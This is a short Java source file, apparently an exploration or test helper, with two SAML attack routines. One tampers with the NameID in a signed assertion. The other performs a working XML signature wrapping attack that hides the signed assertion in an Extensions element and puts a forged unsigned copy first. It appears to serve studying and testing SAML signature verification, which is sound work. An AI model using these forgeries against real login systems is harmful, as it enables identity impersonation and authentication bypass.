package com.jk.explore.security.saml;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;

/** Edits of a genuine response, the way an attacker with a text editor would make them. */
final class Attacks {

    private Attacks() {
    }

    /** Changes the name inside the signed assertion: the signature no longer matches. */
    static String tamper(String response, String newName) {
        Document d = Xml.parse(response);
        Xml.byName(d, Xml.SAML, "NameID").item(0).setTextContent(newName);
        return Xml.write(d);
    }

    /**
     * Signature wrapping: the genuine signed assertion is kept but moved into an Extensions element, where nobody reads it, and an unsigned copy
     * with another name takes its place as the first assertion in the response.
     */
    static String wrap(String response, String forgedName) {
        Document d = Xml.parse(response);
        Element response0 = d.getDocumentElement();
        Element signed = (Element) Xml.byName(d, Xml.SAML, "Assertion").item(0);
        Element forged = (Element) signed.cloneNode(true);
        Node sig = forged.getElementsByTagNameNS(Xml.DS, "Signature").item(0);
        forged.removeChild(sig);
        forged.setAttribute("ID", "forged-1");
        forged.getElementsByTagNameNS(Xml.SAML, "NameID").item(0).setTextContent(forgedName);
        Element extensions = d.createElementNS(Xml.SAMLP, "samlp:Extensions");
        response0.removeChild(signed);
        extensions.appendChild(signed);
        response0.insertBefore(forged, response0.getFirstChild());
        response0.appendChild(extensions);
        return Xml.write(d);
    }

}
